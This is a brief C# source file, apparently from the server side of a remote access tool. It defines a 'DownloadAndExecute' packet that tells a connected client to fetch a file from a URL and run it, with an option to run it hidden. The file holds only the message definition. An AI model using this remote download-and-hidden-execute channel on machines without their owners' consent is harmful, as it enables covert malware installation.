using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DownloadAndExecute : IPacket
    {
        [ProtoMember(1)]
        public string URL { get; set; }

        [ProtoMember(2)]
        public bool RunHidden { get; set; }

        [ProtoMember(3)]
        public string Type { get; set; }

        public DownloadAndExecute()
        {
        }

        public DownloadAndExecute(string url, bool runhidden, string type)
        {
            this.URL = url;
            this.RunHidden = runhidden;
            this.Type = type;
        }

        public void Execute(Client client)
        {
            client.Send<DownloadAndExecute>(this);
        }
    }
}